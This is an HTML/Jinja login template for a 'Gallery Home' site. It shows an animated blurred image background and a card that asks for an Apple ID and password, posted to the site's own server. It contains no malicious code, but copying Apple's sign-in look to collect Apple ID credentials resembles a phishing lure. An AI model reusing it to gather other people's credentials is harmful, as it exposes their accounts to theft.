<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Gallery Home</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="static/Icon.svg" type="image/svg+xml">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", Helvetica, Arial, sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #000;
            overflow: hidden;
        }

        /* Full-screen gallery */
        .bg-gallery {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            overflow: hidden;
        }

        /* Each moving line */
        .gallery-line {
            position: absolute;
            display: flex;
            gap: 8px;
            white-space: nowrap;
        }

        /* Images */
        .gallery-line img {
            width: 60px;
            height: 60px;
            object-fit: cover;
            border-radius: 6px;
            filter: blur(2px);
        }

        /* Scroll animation */
        @keyframes scroll {
            0% {
                transform: translateX(0);
            }

            100% {
                transform: translateX(-50%);
            }
        }

        /* Login card */
        .card {
            position: relative;
            z-index: 2;
            width: 90%;
            max-width: 420px;
            background: #fff;
            border-radius: 24px;
            padding: 32px 22px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.08);
            text-align: center;
        }

        /* Logo and titles */
        .logo img {
            width: 70px;
            margin-bottom: 12px;
        }

        h1 {
            font-size: 22px;
            margin-bottom: 5px;
            color: #1c1c1e;
        }

        .subtitle {
            font-size: 14px;
            color: #6e6e73;
            margin-bottom: 22px;
        }

        /* Input */
        .input-group {
            position: relative;
            margin-bottom: 18px;
        }

        input {
            width: 100%;
            padding: 16px;
            border-radius: 14px;
            border: 1px solid #e0e0e5;
            background: #f7f9fc;
            font-size: 16px;
            outline: none;
            transition: 0.2s;
        }

        label {
            position: absolute;
            left: 14px;
            top: 14px;
            font-size: 14px;
            color: #8e8e93;
            transition: 0.2s;
            background: white;
            padding: 0 4px;
        }

        input:focus+label,
        input:not(:placeholder-shown)+label {
            top: -8px;
            left: 10px;
            font-size: 12px;
            color: #0a84ff;
        }

        input:focus {
            background: #fff;
            border-color: #0a84ff;
            box-shadow: 0 0 0 3px rgba(10, 132, 255, 0.15);
        }

        /* Toggle password */
        .toggle-pass {
            position: absolute;
            right: 12px;
            top: 14px;
            cursor: pointer;
            font-size: 13px;
            color: #0a84ff;
        }

        /* Button */
        button {
            width: 100%;
            padding: 16px;
            border-radius: 16px;
            border: none;
            background: #0a84ff;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
        }

        button:hover {
            background: #007aff;
        }

        button:active {
            transform: scale(0.97);
        }

        button.loading {
            opacity: 0.7;
            pointer-events: none;
        }

        /* Error & security note */
        .error {
            margin-top: 12px;
            color: #ff3b30;
            font-size: 14px;
        }

        .security {
            margin-top: 16px;
            font-size: 12px;
            color: #ff3b30;
            text-align: justify;
        }

        @media (min-width: 768px) {
            .card {
                padding: 40px 30px;
            }
        }
    </style>
</head>

<body>

    <div class="bg-gallery" id="bgGallery"></div>

    <div class="card">
        <div class="logo"><img src="static/Icon.svg"></div>
        <h1>Gallery Home</h1>
        <p class="subtitle">Sign in</p>
        <form method="POST" onsubmit="handleLogin(event)">
            <div class="input-group">
                <input type="text" name="username" required placeholder=" ">
                <label>Apple ID</label>
            </div>
            <div class="input-group">
                <input type="password" id="password" name="password" required placeholder=" ">
                <label>Password</label>
                <span class="toggle-pass" onclick="togglePassword()">Show</span>
            </div>
            <button id="loginBtn" type="submit">Continue</button>
        </form>
        {% with messages = get_flashed_messages() %}
        {% if messages %}
        <div class="error">{{ messages[0] }}</div>
        {% endif %}
        {% endwith %}
        <div class="security">
            🔒 This system is secure and monitored. Unauthorized access may be logged.
        </div>
    </div>

    <script>
        function togglePassword() {
            const pass = document.getElementById("password");
            pass.type = pass.type === "password" ? "text" : "password";
        }
        function handleLogin(e) {
            const btn = document.getElementById("loginBtn");
            btn.classList.add("loading");
            btn.innerText = "Signing in...";
        }

        // Infinite seamless gallery with different speeds
        const bgGallery = document.getElementById("bgGallery");

        function createGallery() {
            bgGallery.innerHTML = '';
            const lineHeight = 68;
            const linesCount = Math.ceil(window.innerHeight / lineHeight) + 1;
            const imagesPerLine = Math.ceil(window.innerWidth / 68) + 1;

            for (let i = 0; i < linesCount; i++) {
                const line = document.createElement('div');
                line.className = 'gallery-line';
                line.style.top = `${i * lineHeight}px`;

                // Different speed for each line
                const speed = 20 + Math.random() * 20; // 20s to 35s
                line.style.animation = `scroll ${speed}s linear infinite`;

                // Add images twice for seamless loop
                for (let j = 0; j < imagesPerLine * 2; j++) {
                    const img = document.createElement('img');
                    const randomId = Math.floor(Math.random() * 1000);
                    img.src = `https://picsum.photos/seed/${randomId}/60/60`;
                    line.appendChild(img);
                }

                bgGallery.appendChild(line);
            }
        }

        // Initial load
        createGallery();

        // Responsive resize
        window.addEventListener('resize', createGallery);
    </script>

</body>

</html>
